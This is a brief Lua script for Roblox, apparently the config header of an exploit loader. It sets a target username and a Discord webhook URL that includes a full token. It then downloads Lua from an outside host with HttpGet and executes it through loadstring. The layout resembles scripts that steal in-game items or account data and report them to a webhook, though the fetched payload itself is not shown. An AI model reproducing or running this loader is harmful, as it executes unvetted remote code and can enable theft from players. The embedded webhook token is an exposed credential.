-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "Chuyminejr7"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1536439400672657530/GIEwcXDvhP6vwkJOrU1HlVTpgpGGREaCrqH6DEN_lDIKflxCBywthLgZeBNbcM4UU2VF"
...
task.spawn(function()
    ...
    loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/62de790db3b7d86c6347d98891b3847ac873205436bd7469628f40bf3b9f6fa2.lua"))()
end)